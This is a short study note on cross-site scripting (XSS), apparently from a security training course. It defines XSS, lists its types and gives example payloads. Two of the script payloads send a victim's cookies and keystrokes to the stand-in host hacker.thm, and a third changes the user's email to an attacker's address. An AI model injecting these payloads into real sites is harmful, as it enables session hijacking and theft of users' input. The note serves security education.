

What is cross-site scripting, XSS?
> Cross-site scripting works by manipulating a vulnerable web site so that it returns malicious JavaScript to users. When the malicious code executes inside a victim's browser, the attacker can fully compromise their interaction with the application. 

XSS Proof Of Concept
> <script>alert(1);</script>

What are the types of XSS attacks?
- Reflected XSS
- Stored XSS, AKA second-order or persistent XSS
- DOM-based XSS

Cross-site Scripting Use-case
- Session Stealing <script>fetch('https://hacker.thm/steal?cookie=' + btoa(document.cookie));</script>
- Key Logger <script>document.onkeypress = function(e) { fetch('https://hacker.thm/log?key=' + btoa(e.key) );}</script>
- Business Logic <script>user.changeEmail('attacker@hacker.thm');</script>